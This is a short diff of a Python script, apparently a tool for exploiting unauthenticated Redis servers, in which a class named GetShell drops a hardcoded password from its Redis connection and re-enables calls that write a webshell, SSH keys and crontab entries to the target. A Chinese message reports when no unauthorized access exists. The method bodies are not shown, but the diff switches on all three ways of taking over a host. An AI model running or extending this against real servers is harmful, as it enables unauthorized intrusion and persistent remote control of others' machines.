@@ -16,7 +16,7 @@ from config import webroot, config
 
 class GetShell(object):
     def __init__(self, host, port=6379):
-        self.conn = redis.Redis(host=host, password='123456',port=port, decode_responses=True)
+        self.conn = redis.Redis(host=host, port=port, decode_responses=True)
         self.host = host
         self.port = port
 
@@ -138,8 +138,8 @@ if __name__ == '__main__':
         print('[-]不存在未授权访问，测试结束。')
     else:
         w.getwebshell()
-#        w.getssh()
-#        w.getcrontab()
+        w.getssh()
+        w.getcrontab()
 
 
 
